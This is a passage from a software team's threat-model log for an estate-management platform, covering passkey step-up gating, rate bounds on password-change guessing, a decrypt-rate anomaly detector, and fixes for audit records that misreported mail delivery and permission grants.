  changed) and cannot reset (the reset mails the NEW address). Their remedy is
  support, which until TB7 means the operator runbook. Recorded plainly: the
  notice is a DETECTION control, not a response one.

## 6o. Threat-model delta — M17 PR5, the passkey surface (2026-08-13)

**What shipped.** Identity's four WebAuthn relying-party routes — shipped in M2
and unreachable for fifteen milestones — gained their first consumers: BFF
resolvers and a web surface for registering, naming, listing and revoking
passkeys, and a passkey path in the shared step-up prompt that every
prompt-and-retry caller inherited without a change. Risk #1's "passkey nudges"
residual treatment moves from unbuilt to partially discharged: the surface
exists and nudges nothing yet; a nudge is copy, not machinery, and can follow.

**Two defects fixed in the shipped machinery before the surface landed on it**
(the PR4 pattern): `hasCredentials` — the WebAuthn half of
`SecondFactorGate.holdsVerifiedFactor` — did not filter `revoked_at`, latent
only because nothing wrote that column; the first revoke route would have armed
it, leaving an account whose last passkey was revoked permanently demanding a
factor it could not produce. And the global `credential_id` uniqueness surfaced
as an unhandled 500 when a second account registered the same authenticator;
it is a typed outcome folded into the one generic ceremony refusal now, because
"this authenticator belongs to another account" is a fact about somebody
else's account.

**Revoking a passkey is STEP-UP GATED, and deliberately unlike the ungated M16
session revoke.** Revoking a session only reduces authority. Revoking a FACTOR
weakens the gate that protects everything else: ungated, a stolen bearer strips
the account's factors, `SecondFactorGate` disarms (no factor ⇒ nothing to
prove ⇒ enrolment ungated), and the thief enrols their own — the 2026-08-12
escalation through the back door. The gate is never vacuous by construction
(the account holds at least the factor being removed), and the fence that
verifies it anchors on the controller's real decorators.

**Failed assertions are on the ledger now** (`webauthn.assertion_failed`). The
2026-08-10 decision said they "emit their own kind"; the code emitted nothing —
an investigator reading the ledger for a §5.1 case saw no trace. The kind is
deliberately in NO rate-bound set: a passkey assertion is not brute-forceable,
and counting it would let a flaky authenticator lock out its own owner.

### Residuals

- **[OWNER: M29]** **THE VAULT ORIGIN AND THE EXTENSION ARE TOTP-ONLY FOR STEP-UP**, and a
  passkey-only account therefore cannot complete any Zone A step-up-gated
  ceremony (vault setup, reset, item delete, escrow configure/rearm/revoke,
  recovery-key publish). Three facts stack: vault-web and the extension prove
  factors only through `POST /v1/auth/stepup` (a 6-digit TOTP body); the
  WebAuthn assertion routes are account-audience only; and identity verifies
  assertions against ONE `rpOrigin`, which is the web app's — so extending the
  ceremony to `vault.<domain>` is an identity change (an expectedOrigin list),
  an audience widening, two vault-edge proxy entries and a fence table update,
  not a client patch. The web surface says this ON SCREEN ("keep an
  authenticator app enrolled — the vault currently accepts only authenticator
  codes"), the M16 honesty pattern rather than a docs-only footnote.
- **[OWNER: M21]** **The reset path is re-declined, explicitly** (§6m question 8, owed by this
  PR): a reset still requires the mailed code and nothing else, even for an
  account holding a passkey. Requiring a passkey assertion at reset would turn
  lost-passkey-plus-forgotten-password into a permanent lockout with no
  recovery codes and no TB7 — the same nobody-locked-out-forever reasoning the
  user chose at PR3, unchanged by the surface existing.
- **[OWNER: M29]** **No passwordless login.** The authenticate routes are session-scoped by
  design (M2's deferral, still deliberate): a passkey here is a step-up factor,
  never a login replacement, and discovery-credential login is its own
  milestone with its own enumeration surface.
- **[OWNER: M34]** **Browser-side ceremony failures are invisible to the platform.** A user
  whose sheet keeps failing generates no ledger events until an assertion
  actually reaches identity; only the device knows. Accepted: the alternative
  is client-side telemetry, which this product does not do. **Corrected scope
  (PR6):** this residual only ever covered failures that never reach identity.
  Two SERVER-side branches were also silent — no live challenge, and a
  credential id naming nothing or naming somebody else's authenticator — which
  was a defect rather than this residual, and is fixed in §6p.

## 6p. Threat-model delta — M17 PR6, the security review (2026-08-13)

**How it ran.** Seven file-scoped discovery lenses over the merged M17
machinery — never a diff range (the M13 lesson) — then TWO adversarial
verifiers per deduped candidate on different angles: reachability in a real
production config, and is-it-already-a-documented-decision, both defaulting to
REFUTED. Twelve raw candidates, twelve after dedup, **two confirmed**, ten
refuted. Every confirmed finding was then re-proved BY EXECUTION against the
running stack before a line was changed, and every fix mutation-tested by
reverting it. ELEVENTH milestone running in which every confirmed finding sits
in machinery the milestone introduced, and both falsify a claim it made about
itself.

**(1) `POST /v1/auth/password` VERIFIED A PASSWORD WITH NO BOUND OF ANY KIND.**
Measured on the running stack rather than argued: twenty-five wrong
current-password guesses from one session, twenty-five plain 401s, no refusal
ever, and the twenty-sixth — the right one — took the account over. The same
volume against `POST /v1/auth/login` produced ten `login.failed` and four
`login.rate_limited`. One credential-guessing action, two routes, one bounded.

The gap is exactly the shape of §6k's own framing: PR1 bounded "the routes that
take a password from an UNAUTHENTICATED caller", and the change route reads as
authenticated — except that the entire reason it asks for the current password
is the stolen-session threat, so its caller is the party the bound is for. It
mattered most for FACTORLESS accounts, which `SecondFactorGate` deliberately
lets through (the bootstrap: nothing exists to prove), so nothing else stood in
the way.

`PASSWORD_CHANGE_BOUND` closes it with M16's two scopes, and the per-SESSION
half is the load-bearing one: unlike login there IS a credential at the point
of failure, so a stolen session exhausts its own budget and stops while the
owner's other sessions keep theirs — the escape that could not port to login
ports here. The refusal is a 429 with its own token (safe: the route already
required a resolved, authenticated caller, so it tells them about themselves)
and its own ledger kind, because a refusal counted by the bound that produced
it feeds its own counter. A reset deliberately does not clear the window: it
revokes every session, so the attacker's credential is already dead.

**(2) TWO OF THE FOUR FAILING ASSERTION BRANCHES LEFT NO LEDGER TRACE.** M17
PR5 added `webauthn.assertion_failed` precisely to correct a decision-log entry
claiming failed assertions "emit their own kind" when the code emitted nothing
— and the correction was incomplete. Only the crypto-verify catch and the
`userVerified` recheck recorded; the two branches that short-circuit EARLIEST
stayed silent. Measured: ten probes against a live account (five with no
challenge, five submitting a foreign credential id after minting a real
challenge) produced ZERO `webauthn.*` rows. A credential id naming nothing or
naming somebody else's authenticator is the most suspicious probe class there
is — no browser produces one by accident — and it was the one that was
invisible. All four branches record now; the wire answer stays uniform, so the
trail gains detail the caller does not.

### What the review REFUTED, and why the refutations are worth keeping

Ten candidates were refuted, and two of the refutations are load-bearing:

- **[OWNER: E1]** *"The account-cap refusal skips the in-memory address record, defeating the
  Argon2-cost bound"* — refuted as ALREADY RECORDED. The address bound is
  documented in §6k as per-process, best-effort and evadable; the account bound
  is a durable new-login ceiling, not an Argon2-cost bound, and its one-hash
  cost on a refusing path is stated inline. The residual is real and already
  written down, which is the difference between a finding and a rediscovery.
- *"Historical `users_versions` rows retain the live Argon2id verifier"* —
  refuted on ordering: the migrator applies 001→011 before the app serves, so a
  fresh deploy installs the redacting trigger before any `users` row is ever
  updated, and migration 008's own comment states the pre-migration window and
  why it ships in PR2's commit.

### Residuals

- **[OWNER: M25]** **One novel-but-unreachable candidate is recorded rather than fixed.** A
  crypto-shredded DEK at email-change completion would surface as a 500 rather
  than the uniform `invalid_code` — no code path destroys a DEK today
  (`destroyDek` still has zero callers). It is NOT fixed here on purpose:
  mapping the decrypt failure to `invalid_code` would tell a user "that code
  didn't work" about an account that has been ERASED, and once erasure exists
  the right behaviour is almost certainly that a shredded account cannot reach
  a ceremony route at all (erasure revokes sessions and moves `users.status`
  off the live allowlist, at which point the 500 disappears as a consequence).
  A wrong answer pinned by a test is harder to displace than an absent one, so
  this is filed as a PRECONDITION on the erasure milestone rather than a
  floating residual.
- **[OWNER: M26]** **Clone detection was the review's other recorded item and is now ANSWERED,
  differently from how it was proposed.** The suggested fix was to revoke the
  credential; the fix taken is to NOTIFY THE OWNER and keep rejecting. The
  counter check is a heuristic: synced passkeys report counter 0 and never
  reach the branch at all (the `storedCounter > 0` guard), so it fires only on
  counter-maintaining authenticators, where a regression is a clone OR a
  firmware/state bug. Auto-revocation would destroy a factor on a hint —
  the M6 rule pointed the wrong way — and on an account with no TOTP it lands
  the owner in exactly the bootstrap-lockout state M17 spent a milestone making
  survivable. `identity.passkey_clone_detected` rides the account-security wire
  (it carries nothing), is sent BEFORE the audit emit so a broker outage cannot
  cancel the warning (the M13 rule), and its delivery outcome rides
  `auth.webauthn.clone_detected` as `notified: delivered|failed` so a warning
  that did not land is visible rather than merely absent. The owner revokes it
  themselves from the surface M17 PR5 shipped.

  **The branch was UNREACHABLE until this change, and only the live drive said
  so.** `@simplewebauthn/server` runs its own counter check inside
  `verifyAuthenticationResponse` and THROWS on a regression, which preempted
  our clone branch and routed every clone into the generic verify catch — so
  the ledger kind, the audit action and (had it shipped as first written) the
  owner's warning were all dead code behind a refusal coming from somewhere
  else. Measured: a forced regression produced two `webauthn.assertion_failed`
  rows and zero `webauthn.clone_detected`. The fix hands the library
  `counter: 0` — its documented "this RP does not track counters" value — so
  this service owns the counter policy and the check runs below, on a VERIFIED
  assertion. That ordering is the security half: checking before verification
  would act on unsigned attacker-supplied bytes and let anyone holding a
  session make the platform mail an owner a clone warning at will. The trigger
  set is unchanged for every reachable state, so no refusal is given up.

  What remains open, stated: a cloned credential stays usable until the owner
  acts, so a later higher-counter assertion from either copy still succeeds.
  That is the deliberate cost of not acting on a heuristic, and the thing that
  would change it is a second signal — not a lower threshold on this one.
- **[ACCEPTED]** **The password-change bound is per-account durable plus per-session durable**,
  both ledger-derived, so unlike the address bound it survives a restart and is
  shared across replicas. It is NOT a global quota and does not bound an
  attacker who can mint sessions — but minting one requires the password, which
  is what they are trying to guess.

## 6q. Threat-model delta — M18 PR2, the decrypt-rate baseline detector (2026-08-13)

**What shipped.** The detection half of §4 TB4's per-principal decrypt-rate
baseline, running in the audit service against the local stack. The detector
derives per-(prefix-class × principal) windowed counts from the append-only
`audit_events` ledger — no counter state an attacker can reset — and emits
`crypto.decrypt_rate.exceeded` through the service's first Kafka producer,
via the sanctioned AuditEmitter path, onto the same topic it consumes: the
anomaly lands in the verified hash chain like any other event. Attribution is
the M18 PR1 registry (the field name's first dotted token); the principal
grain separates the nil-UUID sentinel from every real actor class. Bounds are
fixed reviewed constants set from measured ceilings with a generous
multiplier, and everything OUTSIDE the reviewed table is bound 0 — an
unregistered prefix (`unknown_prefix`), an unmodelled (prefix × principal)
combination (`unmodeled_principal`), and settlement's encrypt-only
`distributions` (`encrypt_only`) each breach at the first decrypt, because a
read path nobody reviewed is itself the anomaly.

**The alert sink is the chain plus a structured log line, and deliberately
nothing else.** No owner notification: the reader of this signal is a
security operator who does not exist until TB7, and making audit a
notifications SEND holder would falsify its fenced zero-credential posture.
The event is the durable record; the log line is the operational tail.

**Advisory by construction.** The detector runs on its own Postgres session
(never the ingestor's serialized chain connection), started only from
main.ts so test suites structurally cannot run it, unref'd, with every fault
terminating in its own catch and one log line — a detector error must never
take the path the consumer's death takes, because killing ingest (the paging
signal) over an advisory neighbour inverts the M9 rule twice. Losing the
detector degrades alerting, never safety.

**Episode semantics and the honest residuals.**
- **[ACCEPTED]** A sustained breach emits ONCE per episode and re-arms when its window
  clears. The episode memory is per-process, so a RESTART may re-emit one
  duplicate for a still-breaching principal, and a failed emit is retried
  next tick — in both cases the fail direction is an EXTRA event.
- **[CLOSED: §6q]** CORRECTED BY THE M18 PR3 REVIEW, which found the unqualified
  "never a lost one" false twice over. (a) The reconciliation that ends
  episodes ran after the emit loop inside the same try, so one failed emit
  skipped it: a principal whose episode had cleared stayed marked announced
  and its NEXT genuine episode was suppressed — a lost anomaly, reproduced
  against the real detector. (b) The emit loop shared one try, so the first
  unemittable breach cancelled every later breach in that tick. Both closed
  (per-emit catch; reconciliation moved ahead of anything that can fail —
  and the mutation harness showed the catch is the load-bearing half and the
  ordering the belt, which is recorded in the code rather than assumed).
- **[OWNER: M26]** STILL TRUE AND NOT FIXABLE HERE: an emit outage lasting longer than the
  300s window loses the anomalies raised inside it, because the retry is
  bounded by the window that produced them. Closing it means persisting an
  anomaly before emitting it — a different design, not a patch.
- **[OWNER: E1]** Bounds for classes the M18 PR1 measurement did not exercise (family,
  asset_event, plaid_item, account, assistant_tool_call, users) are
  PROVISIONAL — sized from neighbouring measured economics and marked as such
  in the table; live traffic is what re-calibrates them, by reviewed commit.
- **[ACCEPTED]** A full asset-projection rebuild of a large estate TRIPS the sentinel's
  asset_event bound BY DESIGN: a mass decrypt is the detected class, and the
  operator running one expects the alarm. One event per episode keeps that
  honest rather than noisy.
- **[ACCEPTED]** Detection latency is bounded by tick cadence (60s) plus the broker hop;
  the window (300s) exceeds both, so nothing legitimate hides between ticks.
- **[ACCEPTED]** The stack e2e's gate pairs a POSITIVE control with the false-positive
  assertion: a deliberate burst past the smallest bound must produce exactly
  its own anomaly, and every anomaly in the store must name that deliberate
  bound. A bare zero-events assertion would be vacuously green over a dead
  detector — the M8 dead-consumer shape.

**The window's clock, and what that costs (M18 PR3).** The sweep selects
`occurred_at >= now - 300s`, and `occurred_at` is stamped by the PRODUCING
service at emit time — the ingestor preserves it, and `audit_events` has no
server-authored ingest-time column. Three consequences, recorded rather than
patched, because the honest fix is a schema change (an ingest-time column, or
windowing on the ingest-ordered `seq`) that belongs to the milestone that
needs it:
- Ingest lag or an audit-service outage longer than the window means the
  backlog arrives already outside every future tick's window and is never
  evaluated. The consumer and the detector are one process, so this is
  exactly the state a detector most needs to survive. Fail direction: a
  MISSED alarm, never a false one.
- A producing service whose clock is more than a window slow has its decrypts
  permanently outside the window — that service's prefixes go dark with no
  fault and no log.
- A far-future `occurred_at` is counted in every window indefinitely, and its
  episode never clears, so that principal's later genuine anomalies are
  suppressed. Authoring one needs a grossly misconfigured clock or the
  ability to forge topic messages — a strictly larger break than the §5.3
  adversary this control is credited against.

**What the audit stream cannot see (M18 PR3).** "Every released plaintext is
one audited event" is a property of code that goes THROUGH `FieldCrypto`. The
package also exports the AEAD `open()` and the KMS unwrap, and a Zone B
process holds unwrapped DEKs in a 5-minute cache — so code executing INSIDE a
compromised service (RCE, a malicious dependency, a malicious-insider deploy)
can decrypt without emitting anything, and the DEK cache means it need not
call KMS either. That tier is not what this detector is for: it is the
credential/identity-compromise case that drives the ordinary API, and against
in-process compromise the answers are the enforcement chokepoint (the KMS
grant), image signing and admission control, and §5.3's canaries. §5.3's
control text should be read with that boundary in mind.

**What remains cloud-blocked, stated precisely:** the ENFORCEMENT half —
suspending the KMS grant and paging — needs real IAM and a TB7 operator;
KMS-side rate limiting still bounds bulk UNWRAPS (many-user sweeps), which
the DEK cache never hid; §5.3's canaries and CloudHSM roots are unchanged.

**The detector's own session (M18 PR3).** It is lazily connected, absorbs
connection-level `error` events, and replaces a dead session on the next
tick. Each of those is a review finding rather than a nicety: an unhandled pg
`error` event crashes the whole audit process (reproduced against a real
cluster), which would have let the ADVISORY detector kill INGEST — the paging
signal — and an error listener alone would have traded that crash for
permanent silent deafness, since a pg Client never reconnects. The session
also carries a query timeout, without which a black-holed socket leaves the
re-entrancy guard latched for hours with nothing logged (the M8
dead-consumer shape). The INGEST connection deliberately keeps the opposite
posture: its death is fatal, and it now routes through the service's fatal
path instead of an uncaught exception, so it dies with a structured line and
releases its handles.

**Coverage gap, stated (M18 PR3).** The stack e2e's false-positive gate runs
in the DEVELOPMENT profile only, so the production rehearsal's journey —
escrow arming, settlement intake, vault enrollment under production config —
runs with a live detector and no anomaly assertion over it. Nothing in that
journey reaches a decrypt class the dev journey does not, which is why this
is recorded rather than duplicated; a production-only decrypt path arriving
later owes the gate a second home.

### 6q(ii). AMENDMENT — the distinct-subject condition (2026-08-14)

**The alarm fired on an owner reading their own estate.** MEASURED against
the running stack: seven ordinary `/assets` page loads of a 120-asset estate
produced 1680 `asset` decrypts in about twenty seconds and raised
`crypto.decrypt_rate.exceeded` (`boundName=asset_user count=1680 bound=1500`).
Nothing was wrong with the reader, the reading, or the count — the count was
right. `asset` is the ONE bound in the table whose legitimate volume scales
with ESTATE SIZE rather than with activity: one `/assets` page load issues
Assets and NetWorth together, so it costs 2 decrypts PER ASSET OWNED, and the
1500 was itself calibrated on the M19 PR2 journey, an estate of a handful of
assets. Estate size is unbounded, so no constant survives it: raise the number
and you false-positive on some larger estate while blinding the detector for
every smaller one. A per-principal count cannot express this, which is why the
fix is a second dimension rather than a bigger number.

**What shipped.** `DecryptRateBound` gained an optional
`maxDistinctSubjectsPerWindow`, and a breach now requires BOTH thresholds to be
strictly exceeded. The subject is the row id already inside the field name,
located by a position declared per prefix in `DECRYPT_FIELD_SUBJECTS`
(@estate/contracts) and counted by the sweep's own
`count(DISTINCT CASE … split_part …)`. Exactly one bound carries the condition
(`asset`/`user`); every other prefix declares no subject, reports 0 distinct,
and decides on the count exactly as before.

**THE DETECTION THRESHOLD IS UNCHANGED — only the amplification is removed.**
The AND is safe because a principal touching N distinct subjects has made at
least N decrypts, so distinct ≤ count always; with the distinct threshold at or
below the count threshold (a table invariant, asserted), anything that clears
the count bound on DISTINCT rows clears the distinct bound too. A mass read of
N different assets still breaches at exactly the N it breached at before. What
the condition suppresses is precisely RE-READING, which moves no plaintext the
principal had not already seen.

**It can only ever suppress, which is why it is declared rather than inferred.**
A wrong subject position is a blind spot, not noise, so `doc` is the recorded
counter-example and is deliberately ABSENT: its field is
`doc.<ownerUserId>.v<n>.<sha>`, so the tempting segment 2 holds the OWNER — the
same value for every document a person holds — and declaring it would collapse
a whole library to one subject and suppress a mass document read. Sampling the
live stream shows a UUID there and invites exactly that mistake, so the
position is read from the code that BUILDS the string:
`packages/contracts/test/decrypt-field-subjects.spec.ts` pins every declared
position to its constructor in the owning service's source, and asserts both
halves of the `doc` case (undeclared, and segment 2 really is the owner).
Merging the sentinel's two actor types SUMS distinct counts, which over-counts
— deliberately, because an upper bound errs toward breaching, the only
direction a suppressing condition may fail in.

**Residuals, stated rather than implied.**
- **[ACCEPTED]** An estate with MORE than 1500 distinct assets still trips on a single page
  load. That is the detection threshold doing its job at the size where the two
  readings genuinely converge, and it is the honest cost of a constant: the
  detector runs in the audit cluster and cannot know how large an estate
  legitimately is without a cross-cluster read its fenced zero-credential
  posture forbids. Re-calibration is a reviewed commit, as for every other row.
- **[ACCEPTED]** A principal who has already read a set may now re-read it without limit. That
  was true of any count bound sitting above the set's size; what changed is
  that it is now true by construction rather than by luck.
- **[ACCEPTED]** The distinct count is only as good as the declaration. A prefix whose id tail
  is not per-row must never be declared, and the fence above is what keeps that
  from being a matter of memory.

**Evidence, one database, one table.** Three principals with the same estate
shape and the same browsing: the pre-fix run (1680 decrypts / 120 distinct)
raised an anomaly carrying `count: 1680` and no distinct fields; two post-fix
runs with byte-identical economics raised none. In the same window a
1501-asset estate read ONCE (3002 decrypts / 1501 distinct) breached, carrying
`distinctSubjects: 1501, distinctBound: 1500` — so the detector demonstrably
ran, and the silence on the browsing principals is a decision rather than a
dead tick.

## 6r. Threat-model delta — M19 the assets surface (2026-08-13)

M19 put the product's first owner-facing surface on the oldest domain
service in the repo. PR1's service hardening (the uniform 404 closing the
404-vs-403 oracle on every asset-scoped path, the list narrowed to one
decrypt per row) and the repo-wide route↔consumer fence are recorded in
docs/04; what belongs HERE is what the ceremony surface (PR3) changes about
the model and what it deliberately leaves open.

**The BFF membership check is best-effort hygiene at the edge, not a
security control, and a direct-API caller walks past it.** Designating a
beneficiary crosses two clusters — the designation lives in the financial
cluster, the contact in core — and docs/02 §8 forbids a cross-cluster FK,
so nothing in the database can make `asset_beneficiaries.contact_id` name a
real contact. The BFF refuses a designate whose contactId is not among the
caller's own contacts, because it is the only layer holding both clients on
the caller's own bearer. A caller speaking to the assets service directly
(any valid session; the service is CallerGuard + StepUpGuard) can still
mint a designation naming any UUID. What bounds it: the designation is in
the caller's OWN estate (Cedar scopes every asset route to the owner), it
directs nothing anywhere (no beneficiary visibility exists — below), the
dangling row renders honestly in the product ("No longer in your contacts")
and stays removable because remove is deliberately unchecked. Closing it
for real means either a projection of contact ids into the financial
cluster (a new consistency surface) or assets consulting profile
server-side (a new credential edge for a hygiene property) — neither is
worth its cost today, and this paragraph is the record of that decision.

**A designation is not access, and the surface says so out loud.** Naming a
beneficiary writes a ledger event and a projection row; it grants no read,
no notification, no visibility of any kind. docs/00 §5.5's "beneficiaries
see only assets naming them" remains UNBUILT — `namedBeneficiaries`
resolution requires the contact-link projection (M13's ceremony provides
the link; no milestone has yet joined it to designations), and until then a
beneficiary structurally cannot learn they were named. The ceremony's copy
carries both truths so an owner does not mistake a designation for an
arrangement anyone else can see. The share-sum constraint
(`share_sum_exceeded`, the repo's one CONSTRAINT TRIGGER) is enforced
per-class in the service and surfaced as its own refusal.

**The step-up retry loop spends decrypts during the propagation window,
and the spend is attributed to the owner themselves.** A step-up-refused
designate re-runs the full mutation while the peer's 30s session cache is
stale (the M13 prompt-and-retry contract), and each retry re-runs the BFF's
membership check — one contacts load, one audited decrypt per contact name
— before assets refuses downstream. MEASURED against the running stack for
one designation on a one-contact estate: five `contact.name` decrypts in
total — one for the picker, THREE membership checks (the refused attempt
plus two retry polls, the elevation propagating on the second), and one for
the name composition on reload. **THE SPEND SCALES WITH THE CONTACT BOOK, NOT
THE DESIGNATION COUNT** — the resolver loads every contact the owner has —
so the five above is a one-contact figure and the M19 PR4 review corrected
the conclusion drawn from it: the theoretical worst case is ~17 polls
across the 35s propagation budget times the whole address book, which for a
50-contact estate is order 850 `contact.name` decrypts and NOT "far under"
the M18 `contact/user` bound of 160/min. It remains self-inflicted (the
owner's own session, on their own trail, only while retrying a step-up they
initiated), which is why the bound firing there is a true positive worth
seeing rather than a false alarm to design around. Recorded rather than
re-engineered: every alternative either duplicates the freshness gate at
the edge (a second copy that drifts) or adds a client-controllable skip
flag to a check whose absence is already a recorded residual (above).

### What the PR4 review changed about the model

**A deletion-class verb had no second factor, and PR2 gave it a button.**
Retirement is the assets service's one IRREVERSIBLE command — every other
command appends a correction, and even a removed designation leaves its
history — so docs/01 §5's "deletion requests" covers it, as assets' own
beneficiary route has complied since M3. It shipped in M3 under `CallerGuard`
alone and nothing revisited it, which was dormant while no client existed and
live the moment M19 PR2 put Retire on screen: a stolen bearer could have
retired an estate's assets one at a time without ever proving a factor.
Closed with `StepUpGuard`, and the route's gate class is now DECLARED AS DATA
and checked against Nest's RUNTIME route metadata, so a future route arrives
with a gate decision or the build fails. **Residual, stated rather than
implied: that fence covers the assets service only.** The other eight services
have no equivalent, and their step-up coverage is still whatever their
controllers happen to say — generalising it is a change to eight services and
belongs to whichever milestone next touches them.

**A globally-unique idempotency index was a cross-user event-existence
oracle.** `asset_events.event_id` was UNIQUE across the whole table and the
lookup carried no owner predicate, so submitting an id belonging to somebody
else answered 409 where an unused id answered 201 — measured live. Because the
ids are CLIENT-generated by design (that is what makes a retry a no-op), an
observed id is a probe. Scoped to `(user_id, event_id)`, and the lookup now
carries the owner, so a foreign id is byte-identical to an unused one. The
owner's own replay still answers 409, which is the feature rather than a leak.

**The version read now fails CLOSED, and that has a price worth naming.** A
projection row and its latest ledger seq were read in separate pool queries —
separate snapshots — with the row first, so a command landing between them
paired OLD state with a NEW version and the caller's next `If-Match` passed
against state they had never seen. That is a silent lost update. Reversed, the
same race pairs new state with an old version and the write is refused with a
409 the surface already handles by re-reading. The cost is real and accepted:
a reader unlucky in that window is told to reload when nothing was wrong with
what they had. Failing closed on a write is the correct side of that trade,
and it is the only side that cannot silently discard someone's edit.

**A rate bound read as an outage.** Identity's step-up cap answers 429
`too_many_attempts`; the BFF had no mapping, so a control firing exactly as
designed surfaced as "something went wrong on our side" (§6k's bound, §6j's
lesson, arriving on the assets surface because M19 put two step-up ceremonies
there). It has its own code and its own copy now — the only refusal in the
union whose remedy is to WAIT rather than to act differently, which is
precisely why it must not borrow the credential code's "enter the current
code" wording. The copy deliberately does not state the window in minutes:
that number is a reviewed constant in a service the web app cannot import, and
a figure people plan around must not be a second copy free to drift.

### Residuals

- **[OWNER: M21]** *The route-gate fence covers the assets service only.* The
  other eight services have no equivalent, so their step-up coverage is still
  whatever their controllers happen to say. Generalising it is a change to
  eight services; the operator platform is the next milestone that touches a
  service's guard surface across the repo, and the fence's own §6r paragraph
  says the assignment was left to "whichever milestone next touches them",
  which is how an item goes uncosted.
- **[OWNER: M28]** *docs/00 §5.5's "beneficiaries see only assets naming them"
  remains UNBUILT.* `namedBeneficiaries` is a default parameter every
  `assetResource` call site takes by omission, so `beneficiary.cedar` is loaded
  and structurally unmatchable. M13's ceremony supplies the contact link; no
  milestone has yet joined it to designations. Same residual as §6s's, reached
  from the other end.
- **[ACCEPTED]** *An unlucky reader is told to reload when nothing was wrong.*
  The version read fails closed, which costs a spurious 409 in one race window
  and is the only side of that trade which cannot silently discard an edit.
- **[ACCEPTED]** *The step-up retry loop's decrypt spend scales with the
  contact book.* Self-inflicted, on the owner's own session and their own
  trail, only while retrying a step-up they initiated — so the M18 bound
  firing there is a true positive worth seeing rather than a false alarm to
  design around.


## 6s. Threat-model delta — permission grants confer only what something reads (2026-08-14)

Found while scoping the next milestone, fixed on its own before it: **the
platform accepted permission grants it did not honour, and told the owner it
had.** `permission_grants` took any lowercase token as a `resource` and any of
three actions; `RolesService.addPermission` wrote the row, `events.service`
audited `permission.granted`, and the people surface listed it back under "What
this role may read". Exactly one pair is read by anything —
`RolesRepo.effectiveContactReadGrants`, profile's only grant reader and the
enforcement behind §5.5's contact boundary, filters `pg.resource = 'contact' AND
pg.action = 'read'`. MEASURED against real Postgres over the six combinations the
surface offered: one conferred access, five conferred nothing, and two of those
five were buttons an owner could press ("Allow: Your assets", "Allow: Your
documents").

**This is worse than a refusal, which is why it is here rather than in a
changelog.** A refused grant is visible and can be worked around. An accepted one
that confers nothing produces a durable false belief about who can see an estate
— an owner who "shared their assets with their executor" has a written record
saying so, and the only way to discover otherwise is to notice that nothing
happened. Nobody gains access they should not have; the exposure is that the
owner's mental model of their own estate is wrong in the permissive direction,
which is the direction that stops them arranging real access.

**What changed.** `enforced-grants.ts` declares the (resource, action) pairs
something honours, with a reason per entry; `addPermission` refuses everything
else with `422 grant_not_enforced` — its own token, kept apart from the generic
parse 400 through the BFF and into the app's copy, because "we have not built
this" and "your request was malformed" send a person to different places (the M9
rule applied to a refusal). The refusal sits AFTER the ownership check, so it can
never answer a question about somebody else's estate (the M10 rule). The people
surface stops offering what nothing enforces and SAYS which parts of an estate
are not shareable, because silence would leave the same wrong belief more
quietly; the link-redemption panel's "anything they choose to share with you" is
narrowed for the same reason. Two fences hold it: profile's asserts the declared
table equals what the reader's SQL really filters on and that no undeclared file
reads grants, and the web's asserts what the surface offers equals what profile
declares — neither side could see this drift alone, since both lists were
internally consistent and both suites were green for three milestones.

**OPEN, and stated rather than implied: role-based sharing covers estate
contacts and nothing else.** There is no mechanism by which an owner can let a
trustee, executor or beneficiary read an asset or a document — not a broken one,
none. §5.5's "unless the owner explicitly opens visibility" and risk #1's
"trusted-contact review mode" describe intent, not shipped controls, and §6r
already records that no beneficiary visibility exists. Building it is a
cross-cluster authorization change (assets and documents are separate services on
separate clusters and hold no profile credential), so it belongs to a milestone
that can take that decision; a new enforced pair arrives in the same change as
the code that reads it, which is what the fence forces.

**Two residuals.**

- **[ACCEPTED]** *Rows written before the vocabulary closed are inert and remain
  in the table.* They render with their label and stay withdrawable rather than
  being hidden or degraded to a bare token, because an owner must be able to
  see and remove a permission that exists.
- **[ACCEPTED]** *The DDL keeps its open `TEXT` column deliberately.*
  `permission_grants` is docs/02 §2 verbatim, migrations are append-only, and
  narrowing it would need a pre-flight over exactly those inert rows; the API
  is the enforcement point and the reader ignores everything else.

## 6t. Threat-model delta — a mail the carrier refused was recorded as delivered (2026-08-14)

**Three identity call sites read a discriminated union's DISCRIMINANT as if it
were its ANSWER.** `SendOutcome` is
`{ accepted: true; delivered: boolean; … } | { accepted: false }`. `accepted`
says a healthy notifications service replied; `delivered` says the mail went,
and the type's own docstring states the rule — *"Callers record either as a
non-delivery."* The notifications service answers `accepted: true,
delivered: false` for `no_recipient` and `carrier_failure` (a crypto-shredded
DEK lands in the latter). These three read the discriminant alone:

- `password-reset.service.ts` — the mailed reset code (`auth.password.reset_requested`)
- `password-reset.service.ts` — the completion notice (`auth.password.reset_completed`)
- `auth.service.ts` — the password-change notice (`auth.password.changed`)

Each of those booleans renders as the literal string `delivered` or `failed` in
an **append-only** audit event, so a notice that never reached anyone was
recorded as delivered. That is the M14 PR0 shape — an audit claim inverted —
and it sat on the account-recovery ceremony, whose entire failure mode is a
user who cannot get in.

**Reachable, not theoretical.** M9's recipient feed is fire-and-forget at
registration and login, so a registration during a notifications outage leaves
no recipient row — and that user is exactly the one who later cannot sign in and
asks for a reset. They receive nothing, and the trail says they were told.

**TypeScript could not catch it, and that is the general lesson.** The union
forces a narrowing on `accepted` before `delivered` may be read, so *stopping at
the narrowing guard type-checks perfectly* while meaning something else. A
discriminant is not an answer.

**Nor could any test, because no double ever answered on the disagreeing arm.**
Every spec in identity's test directory hand-rolled its own notifications double,
and of the twelve that produce an outcome, not one ever returned
`accepted: true, delivered: false`. Measured, because the first draft of this
section claimed something stronger and false ("every one answered a bare
`{ accepted: true }`"): of 38 specs, 13 name `accepted` and 12 produce an
outcome; **four** answered a bare `{ accepted: true }`, which is not a valid
`SendOutcome` at all — the accepted arm carries `delivered`, `channel` and
`recipientVerified` too — but **three produced fully valid four-field outcomes
and were exactly as blind**. So the mechanism was never a malformed shape; it
was an UNEXERCISED ARM, and every producer was `delivered: true`.

The compiler could not close it either: the doubles reach their constructors
through `as never` or `as unknown as NotificationsPort`, and a cast on the outer
object leaves the inner method's return type inferred and never compared to the
port. The M16 PR2b lesson, one layer beneath the fixtures. The one case that
looked like coverage — `auth.service.spec.ts`'s "NOTIFIES the owner, and puts
the outcome on the audit event" — only ever used `{ accepted: false }`, the arm
where the discriminant and the answer AGREE.

**§6l's residual was a promise the code did not keep.** It states that an
undelivered notice "leaves `notified: failed` on the audit event … for an
operator to re-drive". For the password change that was false: a carrier refusal
left `notified: delivered`, so the one record an operator would use to re-drive
said there was nothing to re-drive. The sentence is now true rather than
rewritten.

**The fix is one spelling and a fence, not three edits.** `wasDelivered` in
